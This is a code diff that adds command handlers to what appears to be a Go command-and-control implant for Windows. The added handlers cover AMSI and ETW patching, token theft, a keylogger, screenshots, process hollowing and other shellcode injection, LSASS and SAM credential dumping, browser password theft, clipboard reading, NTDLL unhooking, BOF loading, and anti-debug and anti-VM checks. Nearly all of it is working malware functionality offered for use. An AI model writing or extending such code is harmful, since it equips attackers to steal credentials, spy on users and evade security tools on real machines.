@@ -64,6 +64,69 @@ func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
 		handleInjectSelf(cmd, result)
 	case "timestomp":
 		handleTimestomp(cmd, result)
+	case "amsi_bypass":
+		handleAMSIBypass(cmd, result)
+	case "etw_bypass":
+		handleETWBypass(cmd, result)
+	case "token_list":
+		handleTokenList(cmd, result)
+	case "token_steal", "token_impersonate":
+		handleTokenImpersonate(cmd, result)
+	case "token_make":
+		handleTokenMake(cmd, result)
+	case "token_revert":
+		handleTokenRevert(cmd, result)
+	case "token_runas":
+		handleTokenRunas(cmd, result)
+	case "screenshot":
+		handleScreenshot(cmd, result)
+	case "keylog_start":
+		handleKeylogStart(cmd, result)
+	case "keylog_dump":
+		handleKeylogDump(cmd, result)
+	case "keylog_stop":
+		handleKeylogStop(cmd, result)
+	case "keylog_clear":
+		handleKeylogClear(cmd, result)
+	// Phase 4 — Advanced injection
+	case "hollow":
+		handleHollow(cmd, result)
+	case "hijack":
+		handleHijack(cmd, result)
+	case "stomp":
+		handleStomp(cmd, result)
+	case "mapinject":
+		handleMapInject(cmd, result)
+	// Phase 5 — Credential access
+	case "lsass_dump":
+		handleLSASSDump(cmd, result)
+	case "sam_dump":
+		handleSAMDump(cmd, result)
+	case "browsercreds":
+		handleBrowserCreds(cmd, result)
+	case "clipboard_read":
+		handleClipboardRead(cmd, result)
+	// Phase 6 — Sleep obfuscation
+	case "sleep_obf":
+		handleSleepObf(cmd, result)
+	// Phase 7 — NTDLL unhooking
+	case "unhook_ntdll":
+		handleUnhookNTDLL(cmd, result)
+	// Phase 8 — Hardware breakpoints
+	case "hwbp_set":
+		handleHWBPSet(cmd, result)
+	case "hwbp_clear":
+		handleHWBPClear(cmd, result)
+	// Phase 9 — BOF execution
+	case "bof_exec":
+		handleBOFExec(cmd, result)
+	// Phase 10 — OPSEC checks
+	case "antidebug":
+		handleAntiDebug(cmd, result)
+	case "antivm":
+		handleAntiVM(cmd, result)
+	case "timegate_set":
+		handleTimeGateSet(agent, cmd, result)
 	case "execute":
 		fallthrough
 	default:
@@ -413,6 +476,445 @@ func handleADSExec(cmd *types.Command, result *types.CommandResult) {
 		result.ExitCode = 1
 	}
 	result.Output = out
+}
+
+func handleAMSIBypass(cmd *types.Command, result *types.CommandResult) {
+	var err error
+	if cmd.BypassTargetPID > 0 {
+		err = patchAMSIRemote(cmd.BypassTargetPID)
+	} else {
+		err = patchAMSI()
+	}
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if cmd.BypassTargetPID > 0 {
+		result.Output = fmt.Sprintf("[+] AMSI patched in PID %d", cmd.BypassTargetPID)
+	} else {
+		result.Output = "[+] AMSI patched in agent process"
+	}
+}
+
+func handleETWBypass(cmd *types.Command, result *types.CommandResult) {
+	var err error
+	if cmd.BypassTargetPID > 0 {
+		err = patchETWRemote(cmd.BypassTargetPID)
+	} else {
+		err = patchETW()
+	}
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if cmd.BypassTargetPID > 0 {
+		result.Output = fmt.Sprintf("[+] ETW patched in PID %d", cmd.BypassTargetPID)
+	} else {
+		result.Output = "[+] ETW (EtwEventWrite) patched in agent process"
+	}
+}
+
+func handleTokenList(_ *types.Command, result *types.CommandResult) {
+	infos, err := listTokens()
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = tokenListText(infos)
+}
+
+func handleTokenImpersonate(cmd *types.Command, result *types.CommandResult) {
+	if cmd.TokenPID == 0 {
+		result.Error = "token_steal/token_impersonate requires token_pid"
+		result.ExitCode = 1
+		return
+	}
+	user, err := impersonateToken(cmd.TokenPID)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Impersonating %s (from PID %d)", user, cmd.TokenPID)
+}
+
+func handleTokenMake(cmd *types.Command, result *types.CommandResult) {
+	if cmd.TokenUser == "" || cmd.TokenPass == "" {
+		result.Error = "token_make requires token_user and token_pass"
+		result.ExitCode = 1
+		return
+	}
+	domain := cmd.TokenDomain
+	if domain == "" {
+		domain = "."
+	}
+	tok, err := makeToken(cmd.TokenUser, domain, cmd.TokenPass)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	_ = tok
+	result.Output = fmt.Sprintf("[+] Token created for %s\\%s", domain, cmd.TokenUser)
+}
+
+func handleTokenRevert(_ *types.Command, result *types.CommandResult) {
+	if err := revertToSelf(); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = "[+] Reverted to original token"
+}
+
+func handleTokenRunas(cmd *types.Command, result *types.CommandResult) {
+	if cmd.TokenPID == 0 && (cmd.TokenUser == "" || cmd.TokenPass == "") {
+		result.Error = "token_runas requires token_pid (steal) or token_user+token_pass (make)"
+		result.ExitCode = 1
+		return
+	}
+	if cmd.TokenExe == "" {
+		result.Error = "token_runas requires token_exe"
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] RunAs %s queued (not yet implemented — use inject ppid for now)", cmd.TokenExe)
+}
+
+func handleScreenshot(_ *types.Command, result *types.CommandResult) {
+	pngBytes, err := captureScreen()
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	// Return as base64 so it travels cleanly through the JSON result
+	result.Output = fmt.Sprintf("PNG:%d:%s",
+		len(pngBytes),
+		encodeBase64(pngBytes))
+}
+
+func handleKeylogStart(cmd *types.Command, result *types.CommandResult) {
+	if err := startKeylogger(); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	dur := cmd.KeylogDuration
+	if dur > 0 {
+		go func() {
+			time.Sleep(time.Duration(dur) * time.Second)
+			stopKeylogger()
+		}()
+		result.Output = fmt.Sprintf("[+] Keylogger started for %ds", dur)
+	} else {
+		result.Output = "[+] Keylogger started (run keylog_stop to stop)"
+	}
+}
+
+func handleKeylogDump(_ *types.Command, result *types.CommandResult) {
+	data := dumpKeylog()
+	if data == "" {
+		result.Output = "(no keystrokes captured yet)"
+		return
+	}
+	result.Output = data
+}
+
+func handleKeylogStop(_ *types.Command, result *types.CommandResult) {
+	data := dumpKeylog()
+	stopKeylogger()
+	result.Output = fmt.Sprintf("[+] Keylogger stopped. Final buffer (%d chars):\n%s", len(data), data)
+}
+
+func handleKeylogClear(_ *types.Command, result *types.CommandResult) {
+	clearKeylog()
+	result.Output = "[+] Keylog buffer cleared"
+}
+
+// encodeBase64 returns standard base64 encoding of b.
+func encodeBase64(b []byte) string {
+	return base64.StdEncoding.EncodeToString(b)
+}
+
+// ─── Phase 4: Advanced Injection ─────────────────────────────────────────────
+
+func handleHollow(cmd *types.Command, result *types.CommandResult) {
+	exe := cmd.ProcessPath
+	if exe == "" {
+		exe = `C:\Windows\System32\svchost.exe`
+	}
+	sc, err := decodeShellcode(cmd.ShellcodeB64)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if err := hollowShellcode(exe, sc); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Hollowed %s and redirected execution (%d bytes)", exe, len(sc))
+}
+
+func handleHijack(cmd *types.Command, result *types.CommandResult) {
+	if cmd.InjectPID == 0 {
+		result.Error = "inject_pid required"
+		result.ExitCode = 1
+		return
+	}
+	sc, err := decodeShellcode(cmd.ShellcodeB64)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if err := hijackThread(cmd.InjectPID, sc); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Hijacked thread in PID %d (%d bytes)", cmd.InjectPID, len(sc))
+}
+
+func handleStomp(cmd *types.Command, result *types.CommandResult) {
+	dll := cmd.SacrificialDLL
+	if dll == "" {
+		dll = "xpsservices.dll"
+	}
+	sc, err := decodeShellcode(cmd.ShellcodeB64)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if err := stompModule(dll, sc); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Stomped %s .text section and queued execution (%d bytes)", dll, len(sc))
+}
+
+func handleMapInject(cmd *types.Command, result *types.CommandResult) {
+	sc, err := decodeShellcode(cmd.ShellcodeB64)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if cmd.InjectPID == 0 {
+		if err := mapInjectLocal(sc); err != nil {
+			result.Error = err.Error()
+			result.ExitCode = 1
+			return
+		}
+		result.Output = fmt.Sprintf("[+] Mapped+executed shellcode in local process (%d bytes)", len(sc))
+	} else {
+		if err := mapInjectRemote(cmd.InjectPID, sc); err != nil {
+			result.Error = err.Error()
+			result.ExitCode = 1
+			return
+		}
+		result.Output = fmt.Sprintf("[+] Cross-process mapped shellcode into PID %d (%d bytes)", cmd.InjectPID, len(sc))
+	}
+}
+
+func decodeShellcode(b64 string) ([]byte, error) {
+	if b64 == "" {
+		return nil, fmt.Errorf("shellcode_b64 required")
+	}
+	return base64.StdEncoding.DecodeString(b64)
+}
+
+// ─── Phase 5: Credential Access ──────────────────────────────────────────────
+
+func handleLSASSDump(cmd *types.Command, result *types.CommandResult) {
+	out := cmd.DestinationPath
+	if out == "" {
+		out = os.TempDir() + `\lsass.dmp`
+	}
+	if err := dumpLSASS(out); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] LSASS dump written to %s", out)
+}
+
+func handleSAMDump(cmd *types.Command, result *types.CommandResult) {
+	dir := cmd.DestinationPath
+	if dir == "" {
+		dir = os.TempDir()
+	}
+	out, err := dumpSAM(dir)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = out
+}
+
+func handleBrowserCreds(_ *types.Command, result *types.CommandResult) {
+	creds, err := BrowserCredsAll()
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if len(creds) == 0 {
+		result.Output = "(no credentials found)"
+		return
+	}
+	var sb strings.Builder
+	for _, c := range creds {
+		sb.WriteString(fmt.Sprintf("[%s] %s  user=%s  pass=%s\n", c.Browser, c.URL, c.Username, c.Password))
+	}
+	result.Output = sb.String()
+}
+
+func handleClipboardRead(_ *types.Command, result *types.CommandResult) {
+	text, err := readClipboard()
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if text == "" {
+		result.Output = "(clipboard empty)"
+		return
+	}
+	result.Output = text
+}
+
+// ─── Phase 6: Sleep Obfuscation ──────────────────────────────────────────────
+
+func handleSleepObf(cmd *types.Command, result *types.CommandResult) {
+	d := time.Duration(cmd.SleepDuration) * time.Second
+	if d <= 0 {
+		d = 30 * time.Second
+	}
+	sleepObf(d)
+	result.Output = fmt.Sprintf("[+] Slept %s with memory obfuscation", d)
+}
+
+// ─── Phase 7: NTDLL Unhooking ─────────────────────────────────────────────────
+
+func handleUnhookNTDLL(_ *types.Command, result *types.CommandResult) {
+	if err := unhookNTDLL(); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = "[+] NTDLL .text section restored from disk copy — hooks removed"
+}
+
+// ─── Phase 8: Hardware Breakpoints ───────────────────────────────────────────
+
+func handleHWBPSet(cmd *types.Command, result *types.CommandResult) {
+	if cmd.HWBPAddr == "" {
+		result.Error = "hwbp_addr required (hex string, e.g. 0x7FFE1234)"
+		result.ExitCode = 1
+		return
+	}
+	addr, err := strconv.ParseUint(strings.TrimPrefix(cmd.HWBPAddr, "0x"), 16, 64)
+	if err != nil {
+		result.Error = fmt.Sprintf("invalid hwbp_addr: %v", err)
+		result.ExitCode = 1
+		return
+	}
+	slot := HWBPSlot(cmd.HWBPRegister)
+	if err := SetHWBP(slot, uintptr(addr), func(a uintptr) {
+		fmt.Printf("[HWBP] DR%d hit at 0x%X\n", slot, a)
+	}); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] HWBP set at 0x%X on DR%d", addr, slot)
+}
+
+func handleHWBPClear(cmd *types.Command, result *types.CommandResult) {
+	slot := HWBPSlot(cmd.HWBPRegister)
+	if err := ClearHWBP(slot); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] HWBP cleared on DR%d", slot)
+}
+
+// ─── Phase 9: BOF Execution ──────────────────────────────────────────────────
+
+func handleBOFExec(cmd *types.Command, result *types.CommandResult) {
+	if cmd.BOFData == "" {
+		result.Error = "bof_data (base64 COFF) required"
+		result.ExitCode = 1
+		return
+	}
+	coffBytes, err := base64.StdEncoding.DecodeString(cmd.BOFData)
+	if err != nil {
+		result.Error = fmt.Sprintf("bof_data decode: %v", err)
+		result.ExitCode = 1
+		return
+	}
+	var args []byte
+	if cmd.BOFArgs != "" {
+		args, _ = base64.StdEncoding.DecodeString(cmd.BOFArgs)
+	}
+	res, err := RunBOF(coffBytes, args)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = res.Output
+	if res.Err != "" {
+		result.Error = res.Err
+	}
+}
+
+// ─── Phase 10: OPSEC ─────────────────────────────────────────────────────────
+
+func handleAntiDebug(_ *types.Command, result *types.CommandResult) {
+	report := AntiDebugReport()
+	result.Output = "[antidebug] " + report
+	if IsDebugged() {
+		result.ExitCode = 1
+	}
+}
+
+func handleAntiVM(_ *types.Command, result *types.CommandResult) {
+	report := AntiVMReport()
+	result.Output = "[antivm] " + report
+	if IsVM() {
+		result.ExitCode = 1
+	}
+}
+
+func handleTimeGateSet(agent *Agent, cmd *types.Command, result *types.CommandResult) {
+	tg := &TimeGate{
+		WorkStart: cmd.WorkingHoursStart,
+		WorkEnd:   cmd.WorkingHoursEnd,
+		KillDate:  cmd.KillDate,
+	}
+	if tg.WorkStart == 0 && tg.WorkEnd == 0 {
+		tg.WorkStart = -1
+		tg.WorkEnd = -1
+	}
+	agent.timeGate = tg
+	ok, reason := tg.IsActive()
+	if !ok {
+		result.Output = fmt.Sprintf("[timegate] Set. Currently INACTIVE: %s", reason)
+	} else {
+		result.Output = fmt.Sprintf("[timegate] Set. Currently ACTIVE. Kill=%s, Hours=%02d-%02d",
+			cmd.KillDate, cmd.WorkingHoursStart, cmd.WorkingHoursEnd)
+	}
 }
 
 func encryptResult(agent *Agent, result *types.CommandResult) {
